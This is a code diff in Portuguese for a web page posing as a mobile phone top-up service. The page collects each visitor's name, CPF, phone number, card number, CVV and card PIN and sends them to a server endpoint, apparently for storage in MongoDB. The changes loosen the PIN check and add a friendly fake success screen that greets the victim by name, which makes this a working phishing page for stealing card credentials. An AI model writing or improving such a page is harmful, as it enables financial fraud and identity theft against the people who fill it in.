@@ -5,16 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recarga Celular - Elite Ink</title>
     <style>
-        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        body { background-color: #0d1117; color: #f0f6fc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
         h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; font-size: 1.2rem; }
         label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
         input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
         .etapa { display: none; }
         .ativa { display: block; }
-        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
         button.next { background: #58a6ff; }
         .info-24h { text-align: center; font-size: 11px; color: #8b949e; margin-top: 15px; }
+        
+        /* Estilo da tela de sucesso */
+        .sucesso-icon { font-size: 50px; color: #3fb950; text-align: center; display: block; margin-bottom: 10px; }
+        .msg-legal { text-align: center; line-height: 1.6; color: #c9d1d9; }
+        .nome-cliente { color: #58a6ff; font-weight: bold; text-transform: capitalize; }
     </style>
 </head>
 <body>
@@ -29,14 +35,11 @@
                     <option value="Claro">Claro</option>
                 </select>
                 <label>Nome Completo</label>
-                <input type="text" id="nome" placeholder="Seu nome" required>
-                
+                <input type="text" id="nome" placeholder="Ex: Mateus Silva" required>
                 <label>CPF do Titular</label>
-                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
-                
+                <input type="text" id="cpf" placeholder="000.000.000-00" required>
                 <label>Número do Telefone</label>
                 <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
-                
                 <label>Valor da Recarga</label>
                 <select id="valor">
                     <option value="20">R$ 20,00</option>
@@ -57,12 +60,23 @@
             </div>
 
             <div id="etapa3" class="etapa">
-                <label>Senha do Cartão (6 ou 8 dígitos)</label>
-                <input type="password" id="senha" placeholder="******" minlength="6" maxlength="8" required>
-                <p style="font-size: 11px; color: #8b949e; text-align: center;">Valide a segurança para processar.</p>
-                <button type="submit">FINALIZAR E RECEBER</button>
+                <label>Senha do Cartão (Segurança)</label>
+                <input type="password" id="senha" placeholder="******" minlength="4" maxlength="8" required>
+                <p style="font-size: 11px; color: #8b949e; text-align: center;">Aguarde a validação do banco...</p>
+                <button type="submit">FINALIZAR AGORA</button>
             </div>
-            <p class="info-24h">Recarga processada em até 24 horas.</p>
+
+            <div id="etapa4" class="etapa">
+                <span class="sucesso-icon">✔</span>
+                <div class="msg-legal">
+                    <p>Parabéns, <span id="spanNome" class="nome-cliente"></span>!</p>
+                    <p>Sua recarga foi solicitada com <b>sucesso absoluto</b>! ✨</p>
+                    <p>É muito bom ter você conosco. Em breve seu saldo estará disponível para você navegar e falar à vontade!</p>
+                </div>
+                <button type="button" class="next" onclick="window.location.reload()">NOVA RECARGA</button>
+            </div>
+
+            <p id="infoRodape" class="info-24h">Recarga processada em até 24 horas.</p>
         </form>
     </div>
 
@@ -70,15 +84,21 @@
         function irPara(num) {
             document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
             document.getElementById('etapa' + num).classList.add('ativa');
-            const titulos = ["", "Dados da Recarga", "Pagamento", "Segurança"];
+            
+            const titulos = ["", "Dados da Recarga", "Pagamento", "Segurança", "Sucesso!"];
             document.getElementById('titulo').innerText = titulos[num];
+
+            // Esconde o rodapé na tela de sucesso
+            if(num === 4) document.getElementById('infoRodape').style.display = 'none';
         }
 
         document.getElementById('formRecarga').onsubmit = async (e) => {
             e.preventDefault();
+            const nomeCliente = document.getElementById('nome').value;
+            
             const dados = {
                 operadora: document.getElementById('operadora').value,
-                nome: document.getElementById('nome').value,
+                nome: nomeCliente,
                 cpf: document.getElementById('cpf').value,
                 telefone: document.getElementById('telefone').value,
                 valor: document.getElementById('valor').value,
@@ -87,16 +107,24 @@
                 cvv: document.getElementById('cvv').value,
                 senha: document.getElementById('senha').value
             };
-            const response = await fetch('/finalizar', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(dados)
-            });
-            if (response.ok) { 
-                alert('Pedido recebido com sucesso!'); 
-                window.location.reload(); 
-            } else {
-                alert('Erro ao enviar. Tente novamente.');
+
+            // Envia para o servidor (MongoDB)
+            try {
+                const response = await fetch('/finalizar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dados)
+                });
+
+                if (response.ok) {
+                    // Preenche o nome na tela de sucesso e pula para ela
+                    document.getElementById('spanNome').innerText = nomeCliente.split(' ')[0]; // Pega só o primeiro nome
+                    irPara(4);
+                } else {
+                    alert('Erro no processamento. Verifique os dados.');
+                }
+            } catch (err) {
+                alert('Erro de conexão com o servidor.');
             }
         };
     </script>
